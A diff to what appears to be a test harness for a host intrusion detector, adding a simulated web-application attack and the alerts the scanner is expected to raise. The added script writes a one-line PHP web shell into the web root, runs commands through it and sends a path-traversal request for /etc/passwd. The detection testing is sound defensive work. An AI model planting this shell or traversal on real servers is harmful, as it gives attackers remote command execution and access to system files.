@@ -173,6 +173,43 @@ for n in $(seq 1 150); do
         | runuser -u www-data -- /usr/sbin/sendmail "r$n@d$((n % 60)).invalid" || fail mail
 done
 sleep 30
+# --- Web application (2.8) ---
+# A web shell dropped in the web root and used: it runs id and a shell as
+# the web account (the audit rules record them), and answers a request
+# carrying a path traversal.
+root=/usr/share/nginx/html
+[ -d /etc/nginx/sites-enabled ] && root=/var/www/html
+printf '%s\n' '<?php echo shell_exec($_GET["c"] ?? "id"); ?>' > "$root/cc-shell.php" \
+    || fail webshell
+for c in id 'uname%20-a' 'sh%20-c%20id'; do
+    curl -s -o /dev/null "http://127.0.0.1/cc-shell.php?c=$c" || fail webshell-request
+done
+curl -s -o /dev/null "http://127.0.0.1/cc-shell.php?c=id&f=../../etc/passwd" || true
+out=$(curl -s "http://127.0.0.1/cc-shell.php?c=id")
+case "$out" in *uid=*) ;; *) fail "webshell-run: ${out:0:200}" ;; esac
+sleep 3
+"""
+
+# Before the baseline: nginx set up to run PHP through PHP-FPM. Rocky's
+# nginx does once php-fpm is installed (default.d/php.conf); Ubuntu's site
+# needs it.
+WEB_SETUP = r"""
+set -eu
+if [ -d /etc/nginx/sites-enabled ]; then
+    sock=$(ls /run/php/php*-fpm.sock | head -1)
+    cat > /etc/nginx/sites-available/default <<SITE
+server {
+    listen 80 default_server;
+    root /var/www/html;
+    index index.html index.php;
+    location ~ \.php\$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:$sock;
+    }
+}
+SITE
+fi
+systemctl reload nginx
 """
 
 
@@ -245,6 +282,17 @@ def expectations(root_fingerprint: str) -> list[Expected]:
         Expected("mail from the web-server account", "mail.web_user", "www-data", "medium"),
         Expected("a burst of outgoing mail", "mail.volume", "deliveries attempted", "medium"),
         Expected("mail to many new domains", "mail.domains", "new domains", "medium"),
+        Expected("a web shell running programs", "web.worker_child", "", "high"),
+        Expected(
+            "requests answered by the new web shell", "web.new_script_hit", "cc-shell.php", "high"
+        ),
+        Expected(
+            "a traversal the web shell answered",
+            "web.exploit",
+            "",
+            "medium",
+            "traversal attack answered",
+        ),
     ]
 
 
@@ -351,8 +399,10 @@ async def detect(
                 "{scanner_key}", scanner_key.export_public_key().decode().strip()
             )
             await conn.run(setup, check=True, timeout=600)
+            await conn.run(WEB_SETUP, check=True, timeout=120)
             home = work / f"{distro}-home"
-            config, _ = initialise(home)
+            # Access logs too: the web checks read them (policy §7's opt-in).
+            config, _ = initialise(home, web_access_logs=True)
             scanner = Host(
                 name=distro,
                 address=address,
